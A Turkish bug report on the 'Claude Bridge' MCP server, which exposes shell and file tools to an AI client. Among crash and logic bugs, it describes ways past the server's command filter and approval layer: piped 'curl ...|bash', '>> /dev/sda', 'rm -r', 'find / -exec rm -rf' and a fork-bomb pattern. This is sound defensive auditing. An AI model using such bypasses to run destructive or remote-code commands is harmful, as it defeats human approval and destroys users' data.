# Claude Bridge — Kapsamlı Bug Raporu

> **Tarih:** 2026-04-27  
> **Kapsam:** `src/claude_bridge/` ve `tests/` dizinlerindeki tüm Python dosyalarının satır satır incelenmesi  
> **Toplam Bulgu:** 31 bug (5 Critical, 6 High, 11 Medium, 9 Low)  
> **Son Güncelleme:** 2026-04-27 (P1 config generator güvenlik açığı eklendi)
> **Test Durumu:** 137 test geçiyor

---

## CRITICAL (5)

### C0. `prompt.py:62-69` + `README.md:42,104` + `test_cli.py:18` — Config generator varsayılan olarak server-side approval'ı devre dışı bırakıyor

```python
# prompt.py:62-69
env["CLAUDE_BRIDGE_CLIENT_MANAGED_APPROVAL"] = "1"
```

Runtime default'lar sertleştirilmiş olsa da, `claude-bridge setup` komutu ve README'deki örnek config her seferinde `CLAUDE_BRIDGE_CLIENT_MANAGED_APPROVAL=1` hardcode ediyor. Bu şu anlama gelir:

- README'yi veya `claude-bridge setup` çıktısını takip eden herkes sessizce yerel onay prompt'larını atlar
- MCP client'ı approval UI implement etmiyorsa (Claude Desktop dışındaki client'lar) `run_shell`, `write_file`, `patch_file`, `undo_last_patch` için onay katmanı tamamen kalkar
- Server tarafındaki sertleştirme fix'leri anlamsız hale gelir

**Etkilediği yerler:**
- `src/claude_bridge/prompt.py:62-69` — config generator
- `README.md:42` — örnek config
- `README.md:104` — dokümantasyon
- `tests/test_cli.py:18` — test bu davranışı beklenen olarak kilitlemiş

**Çözüm:** Config generator'ı güvenli default'a çek (`CLAUDE_BRIDGE_CLIENT_MANAGED_APPROVAL=0`). Claude Desktop için client-managed approval'ı sadece `--force-client-approval` gibi açıkça istenirse üreten bir seçenek yap.

---

### C1. `git_ops.py:35-37` — Yakalanmayan `ValueError` tüm dosya işlemlerini çökertir

```python
relative_file = target_path.resolve().relative_to(repo_root).as_posix()
```

Çözümlenen dosya yolu `repo_root` içinde değilse (symlink sınırları, `git rev-parse` farkı) `relative_to` `ValueError` fırlatır. Bu hata yakalanmaz ve `write_file`, `patch_file`, `undo_last_patch`'in tamamını çökertir.

**Çözüm:** `try/except ValueError` ile sar ve güvenli hata diktisi dön.

---

### C2. `shell_tools.py:188-195` — Yakalanmayan `UnicodeDecodeError`

```python
result = subprocess.run(..., text=True, ...)
```

`text=True` stdout/stderr'ı sistem encoding'i ile çözer. Çözülemeyen bayt varsa `UnicodeDecodeError` fırlatır. Mevcut `try/except` sadece `TimeoutExpired` ve `OSError` yakaladığı için MCP tool yanıtı çöker.

**Çözüm:** `except (UnicodeDecodeError, ValueError)` ekle veya `encoding="utf-8", errors="replace"` kullan.

---

### C3. `tool_utils.py:155-158` — `input()` MCP stdio protokolünü bozar

```python
answer = input("Approve? (y/n): ").strip().lower()
```

`auto_approve=False` ve `client_managed_approval=False` olduğunda `request_approval` stdin'den `input()` çağırır. MCP stdio transport modunda stdin MCP protokolüne ait olduğu için mesaj akışını bozar, asılı kalma veya protokol desync'e yol açar. Onay gerektiren tool'lar kullanılamaz.

**Çözüm:** İkinci onay modu da kapalıysa hata döndür. MCP client her zaman `client_managed_approval` kullanmalı.

---

### C4. `indexing.py:217-220` — `extract_symbols` SyntaxError'da `index_codebase`'i çökertir

```python
for file in source_files:
    try:
        source = file.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError):
        continue
    symbols = extract_symbols(file, source)  # SyntaxError burada crash yapar!
```

`ast.parse()` SyntaxError fırlatabilir ama `extract_symbols` çağrısı try-except ile korunmamış. Projede syntax hatası olan tek bir `.py` dosyası `index_codebase` ve `find_relevant_files` araçlarının tamamını çökertir.

**Çözüm:** `extract_symbols` çağrısını `try/except SyntaxError: continue` ile sar.

---

## HIGH (6)

### H1. `server.py:209,271,282` — Thread-güvenli olmayan monkey-patching (race condition)

```python
_file_tools_mod._git_commit = _git_commit
```

Her `write_file`, `patch_file` ve `undo_last_patch` çağrısında modül seviyesindeki fonksiyon referansı üzerine yazılır. Eşzamanlı async MCP tool çağrılarında bir görev eski veya eksik atanmış referans okuyabilir. Tamamen gereksiz — `file_tools.py` zaten `project_dir` parametresini açıkça iletiyor.

**Çözüm:** `_git_commit` atamasını başlatma sırasında (`set_config`) bir kez yap, her tool çağrısında tekrarlama.

---

### H2. `shell_tools.py:47-48` — Boşluk olmadan pipe sözdizimi shell engellemesini atlatır

```python
if head == "curl" and any(token in {"|", "&&", ";"} for token in lower_tokens):
```

`shlex.split("curl http://x|bash")` → `["curl", "http://x|bash"]` üretir. Pipe URL token'ının içinde, ayrı token olarak değil. `curl http://x|bash`, `curl url;bash` (operatörler etrafında boşluk yok) filtreyi atlatır.

**Çözüm:** Her token'ın içinde `|`, `&&`, `;` alt dizgi olarak da kontrol et.

---

### H3. `shell_tools.py:64` — `>>` redirect kontrolü kaçırılıyor

```python
if any(token == ">" for token in tokens) and "/dev" in normalized:
```

`shlex.split("cmd >> /dev/sda")` → `["cmd", ">>", "/dev/sda"]` üretir. Token `">>"` değil `">"`, eşleşmez. Yıkıcı append redirect'leri cihaz dosyalarına engellenmez.

**Çözüm:** `">>"` token'ını da kontrol et.

---

### H4. `tool_utils.py:36` — `personal_user_path` regex meşru dosya yazma işlemlerini engelliyor

```python
"personal_user_path": r"/Users/[^/\s]+/",
```

`find_secret_patterns` dosya yazma işlemlerini engellemek için kullanılır. `/Users/john/project` gibi bir yol içeren herhangi bir dosya içeriği eşleşir ve yazma engellenir. Meşru kod, config ve dokümantasyon yazılamaz.

**Çözüm:** `personal_user_path`'i `_SECRET_PATTERNS`'dan kaldır, veya uyarı kategorisine taşı.

---

### H5. `file_tools.py:504-507` — `search_in_files` limit break mantığı hatalı

```python
results.append(...)
if len(results) >= limit:
    break
```

`break` sadece iç döngüyü (`for line_number`) kırar, dış döngüyü (`for file_path`) kırmaz. Limit = 50 iken ilk dosyada 50 eşleşme bulunsa bile ikinci dosyaya geçilir ve sonuç sayısı limit'i aşar.

**Çözüm:** Dış döngüde de `if len(results) >= limit: break` ekle.

---

### H6. `file_tools.py:382-386,597-598` — `infer_project_root` çağrısında `PermissionError` yakalanmıyor

`resolve_path(file)` ile `infer_project_root(target)` arasında aktif proje dizini eşzamanlı bir async görev tarafından `switch_project_root` ile değiştirilebilir. `infer_project_root` `PermissionError` fırlatabilir ve `patch_file`, `write_file`, `undo_last_patch`'de yakalanmaz.

**Çözüm:** `infer_project_root` çağrısını `try/except PermissionError` ile sar, veya proje dizinini bir kez snapshot'la.

---

## MEDIUM (11)

### M1. `config.py:51` — Boş env değişkeni `True` olarak değerlendiriliyor

```python
client_managed_approval = raw_client_managed not in {"0", "false", "no", "off"}
```

`CLAUDE_BRIDGE_CLIENT_MANAGED_APPROVAL=""` (boş) olduğunda `""` false-set içinde olmadığı için `True` olur. Beklenmedik şekilde client-managed approval etkinleşir.

**Çözüm:** `if not raw_client_managed:` ile boş değeri kontrol et, veya pozitif eşleşme seti kullan.

---

### M2. `file_tools.py:403` — `created`/`overwritten` raporlama mantık hatası

```python
"created": not overwrite,
"overwritten": overwrite,
```

`overwrite=True` ve dosya mevcut değilken `created: False, overwritten: True` raporlanır. Dosya gerçekte oluşturulmuştur.

**Çözüm:** `"created": not previous_exists, "overwritten": previous_exists and overwrite`

---

### M3. `file_tools.py:585` — CRLF satır sonu kestirimi karışık satır sonlarını bozar

```python
new_content = new_content_norm.replace("\n", "\r\n") if "\r\n" in original else new_content_norm
```

Orijinal dosyada herhangi bir `\r\n` varsa tüm `\n`'ler `\r\n`'ye çevrilir. Karışık satır sonlu dosyalar bozulur.

**Çözüm:** Satır bazlı CRLF takibi yap veya dönüşümü hiç yapma.

---

### M4. `shell_tools.py:55-60` — `rm -r` ( `-f` olmadan) engellenmiyor

```python
if "r" in option_chars and "f" in option_chars:
    return "rm -rf"
```

`rm -r /some/dir` engellenmez. `-f` olmadan özyinelemeli silme hala yıkıcıdır.

**Çözüm:** `"r" in option_chars` olduğunda `"f"` bağımsız olarak da engelle.

---

### M5. `shell_tools.py:127` — Yıkıcı git komutları orta risk olarak sınıflandırılıyor

```python
elif head in {"python", "python3", "pip", "pip3", "npm", "pnpm", "yarn", "git"}:
    risk_level = "medium"
```

`git reset --hard`, `git clean -fd`, `git push --force` hepsi "medium". `git-reset` satır 133'de asla eşleşmez çünkü head token `git`, `git-reset` değildir.

**Çözüm:** `head == "git"` ve `tokens[1]` yıkıcı ise yüksek risk'e yükselt.

---

### M6. `workflow_tools.py:1004-1006` — `find_relevant_files` hatası kontrol edilmiyor

```python
relevant_payload = json.loads(await find_relevant_files(...))
relevant_results = relevant_payload["details"].get("results", [])
```

Hata durumunda sessizce boş sonuçlarla devam eder, kullanıcıya bilgi verilmez.

**Çözüm:** `relevant_payload.get("ok")` kontrol et.

---

### M7. `tool_utils.py:105-118` — `resolve_path` config durumunda TOCTOU sorunu

`allowed_roots()` ve `project_dir()` ayrı kilitle alınmış çağrılarla okunur. Arada config değişebilir, bir kök kümesine karşı kontrol edilen yol farklı bir proje dizinine çözümlenebilir.

**Çözüm:** `_CONFIG_LOCK`'ı bir kez al ve her iki değeri atomik oku.

---

### M8. `file_tools.py:487` — `relative_to(root)` alt dizin aramasında `ValueError` fırlatabilir

```python
relative_path = file_path.relative_to(root).as_posix() if target.is_dir() else file_path.name
```

`project_root != root` olduğunda (alt dizin araması) bazı dosyalar `project_root` içinde ama `root` içinde olmayabilir.

**Çözüm:** `try/except ValueError` ile sar ve `file_path.name`'e geri dön.

---

### M9. `workflow_tools.py:337` — `build_context_pack`'te `relative_to` `ValueError` fırlatabilir

```python
(candidate, _test_file_score(candidate.relative_to(project_root)))
```

Symlink çözümlemeleri çözülmemiş `project_root` ile eşleşmeyebilir.

**Çözüm:** `try/except ValueError` ile sar ve 0 puanla devam et.

---

### M10. `server.py:365-394` — `index_codebase` genel `OSError` yakalamıyor

`build_index` `root.rglob("*")` ve `file.stat()` çağırır. `PermissionError`/`FileNotFoundError`/`NotADirectoryError` dışındaki `OSError` türleri çöker.

**Çözüm:** `except OSError as exc` ekleyip `"code": "index_error"` dön.

---

### M11. `server.py:147-148` — `_supplemental_review_targets` hata yönetimi eksik

```python
def _supplemental_review_targets(target: Path) -> list[Path]:
    return _supplemental_review_targets_impl(target, _infer_project_root(target))
```

`_infer_project_root(target)` PermissionError fırlatabilir ve hiçbir çağıranı bu hatayı yakalamıyor.

**Çözüm:** `try/except PermissionError` ile sar.

---

## LOW (9)

### L1. `git_ops.py:15-55` — `subprocess.run` çağrılarında timeout yok

Üç subprocess çağrısının (`rev-parse`, `init`, `add`, `commit`) hiçbirinde `timeout` yok. Takılan git işlemi MCP tool'u süresiz engeller.

**Çözüm:** `timeout=30` ekle.

---

### L2. `shell_tools.py:130,133` — `find -exec rm -rf {} +` engellemeyi atlatır

`rm -rf` engellemesi sadece `tokens[0] == "rm"` olduğunda tetiklenir. `find / -exec rm -rf {} +` komutunun head token'ı `find`.

**Çözüm:** `find -exec` sonrası tehlikeli alt komutları tara.

---

### L3. `indexing.py:142` — Bozuk symlink kenar durumu

```python
iterator = root.rglob("*") if root.is_dir() else [root]
```

`root` bozuk bir symlink ise hem `is_dir()` hem `is_file()` `False` döner. Var olmayan yol üzerinde `rglob` `OSError` fırlatır.

**Çözüm:** `root.exists()` kontrol et.

---

### L4. `workflow_tools.py:794` — `workflow_prompt` mode doğrulaması yapmıyor

```python
return prompts[mode]
```

Geçersiz mode ile `KeyError` fırlatır. Public fonksiyon savunma kontrolü yok.

**Çözüm:** `prompts.get(mode)` ile kontrol ekle.

---

### L5. `config.py:41` — Var olmayan `CLAUDE_BRIDGE_PROJECT_DIR` doğrulanmıyor

```python
project_dir = Path(os.environ.get("CLAUDE_BRIDGE_PROJECT_DIR", str(Path.cwd()))).resolve()
```

`Path.resolve()` var olmayan yollar için başarılı olur. Yazım hatası geçerli ama var olmayan proje dizinine yol açar.

**Çözüm:** `if not project_dir.exists():` kontrolü ekle.

---

### L6. `shell_tools.py:66` — Fork bombası kontrolü kırılgan

```python
if ":(){" in normalized:
```

Boşluk pozisyonları farklı olan varyantları yakalamayabilir. Meşru kodda `:(){` false positive'a yol açabilir.

**Çözüm:** Regex `r":\s*\(\s*\)\s*\{"` kullan.

---

### L7. `file_tools.py:126` — Boş `search` string'i yanlış raporlanıyor

```python
matches = original_norm.count(search_norm)
```

`search = ""` ise `str.count("")` → `len(str) + 1` döndürür, her dosyada matches > 1 olur. "Ambiguous" yerine "empty" hatası olmalı.

**Çözüm:** `if not search_norm:` kontrolü ekle.

---

### L8. `file_tools.py:31-32` — `_LAST_BRIDGE_CHANGE` tek global değişken (race condition riski)

İki eşzamanlı tool çağrısı `_remember_bridge_change` ile state'in üzerine yazar. `undo_last_patch` sadece son değişikliği geri alır, ilki kaybolur. Lock atomikliği korur ama üzerine yazmayı engellemez.

**Çözüm:** Değişiklik geçmişi için yığın (stack) kullan.

---

### L9. `tool_utils.py:106-117` — `resolve_path` asimetrik davranış

Relative path'ler sadece `project_dir()` içinde kontrol edilirken, absolute path'ler tüm `allowed_roots()` içinde kontrol edilir. Kullanıcı relative path ile ikincil bir köke erişemez. Bu asimetri dokümante edilmemiştir.

**Çözüm:** Dokümantasyona ekle veya relative path'ler için de `allowed_roots` kontrolü yap.

---

## Özet Tablosu

| ID | Şiddet | Dosya | Satır | Kısa Açıklama |
|----|--------|-------|-------|---------------|
| C0 | Critical | prompt.py + README.md + test_cli.py | 62-69 | Config generator varsayılan approval'ı devre dışı bırakıyor |
| C1 | Critical | git_ops.py | 35-37 | Yakalanmayan ValueError — tüm dosya işlemleri çöker |
| C2 | Critical | shell_tools.py | 188-195 | Yakalanmayan UnicodeDecodeError |
| C3 | Critical | tool_utils.py | 155-158 | input() MCP protokolünü bozar |
| C4 | Critical | indexing.py | 217-220 | extract_symbols SyntaxError crash |
| H1 | High | server.py | 209,271,282 | Thread-güvenli olmayan monkey-patching |
| H2 | High | shell_tools.py | 47-48 | Pipe sözdizimi bypass |
| H3 | High | shell_tools.py | 64 | >> redirect kontrolü kaçar |
| H4 | High | tool_utils.py | 36 | personal_user_path false-positive engelleme |
| H5 | High | file_tools.py | 504-507 | search_in_files limit break hatası |
| H6 | High | file_tools.py | 382-386 | infer_project_root PermissionError yakalanmıyor |
| M1 | Medium | config.py | 51 | Boş env değişkeni True değerlendirilir |
| M2 | Medium | file_tools.py | 403 | created/overwritten raporlama mantık hatası |
| M3 | Medium | file_tools.py | 585 | CRLF kestirimi karışık satır sonlarını bozar |
| M4 | Medium | shell_tools.py | 55-60 | rm -r (-f olmadan) engellenmez |
| M5 | Medium | shell_tools.py | 127 | Yıkıcı git komutları orta risk |
| M6 | Medium | workflow_tools.py | 1004-1006 | find_relevant_files hatası sessiz yutulur |
| M7 | Medium | tool_utils.py | 105-118 | resolve_path TOCTOU |
| M8 | Medium | file_tools.py | 487 | relative_to ValueError (alt dizin araması) |
| M9 | Medium | workflow_tools.py | 337 | relative_to ValueError (context pack) |
| M10 | Medium | server.py | 365-394 | index_codebase OSError yakalamıyor |
| M11 | Medium | server.py | 147-148 | _supplemental_review_targets hata yönetimi |
| L1 | Low | git_ops.py | 15-55 | subprocess.run timeout yok |
| L2 | Low | shell_tools.py | 130,133 | find -exec rm -rf bypass |
| L3 | Low | indexing.py | 142 | Bozuk symlink OSError |
| L4 | Low | workflow_tools.py | 794 | workflow_prompt mode doğrulama yok |
| L5 | Low | config.py | 41 | Var olmayan proje dizini doğrulanmıyor |
| L6 | Low | shell_tools.py | 66 | Fork bombası kontrolü kırılgan |
| L7 | Low | file_tools.py | 126 | Boş search string'i yanlış raporlanıyor |
| L8 | Low | file_tools.py | 31-32 | _LAST_BRIDGE_CHANGE race condition |
| L9 | Low | tool_utils.py | 106-117 | resolve_path asimetrik davranış |

| Şiddet | Sayı |
|--------|------|
| Critical | 5 |
| High | 6 |
| Medium | 11 |
| Low | 9 |
| **Toplam** | **31** |

---

## Öncelikli Düzeltme Sırası

1. **C0** — prompt.py config generator → setup/README varsayılan approval'ı devre dışı bırakıyor, tüm sertleştirme fix'leri anlamsızlaşıyor
2. **C1** — git_ops.py ValueError → tüm dosya yazma/patch çöker
3. **C2** — UnicodeDecodeError → shell komutu çıktısı çözülemezse çöker
4. **C3** — input() MCP protokolünü bozar → onay tool'ları çalışmaz
5. **C4** — extract_symbols SyntaxError → indeksleme araçları çöker
6. **H1** — monkey-patching kaldır → race condition riski
7. **H4** — personal_user_path kaldır → meşru yazma engelleniyor
8. **H5** — search_in_files limit düzelt → sonuç sayısı kontrolsüz
